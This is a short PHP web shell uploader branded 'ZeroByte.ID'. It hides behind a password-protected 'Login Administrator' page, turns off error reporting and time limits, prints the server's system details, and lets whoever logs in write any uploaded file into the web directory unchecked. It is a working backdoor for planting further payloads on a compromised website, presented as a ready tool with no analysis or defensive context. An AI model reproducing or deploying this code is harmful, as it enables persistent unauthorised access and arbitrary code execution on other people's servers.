<?php
$password = '935dc65b087f339a5d7fe6cd51e9ab2c';
error_reporting(0);
set_time_limit(0);

session_start();
if (!isset($_SESSION['loggedIn'])) {
    $_SESSION['loggedIn'] = false;
}

if (isset($_POST['password'])) {
    if (md5($_POST['password']) == $password) {
        $_SESSION['loggedIn'] = true;
    }
} 

if (!$_SESSION['loggedIn']): ?>

<html><head><title>Login Administrator</title></head>
  <body bgcolor="black">
    <center>
    <p align="center"><center><font style="font-size:13px" color="red" face="text-dark">
    <form method="post">
      <input type="password" name="password">
      <input type="submit" name="submit" value="  Login"><br>
    </form>
  </body>
</html>

<?php
exit();
endif;
?>


<?php
echo "PHP Uploader - ZeroByte.ID";
echo "<br>".php_uname()."<br>";
echo "<form method='post' enctype='multipart/form-data'>
<input type='file' name='zb'><input type='submit' name='upload' value='upload'>
</form>";
if($_POST['upload']) {
	if(@copy($_FILES['zb']['tmp_name'], $_FILES['zb']['name'])) {
	echo "Success!";
	} else {
	echo "Failed to Upload.";
	}
}
?>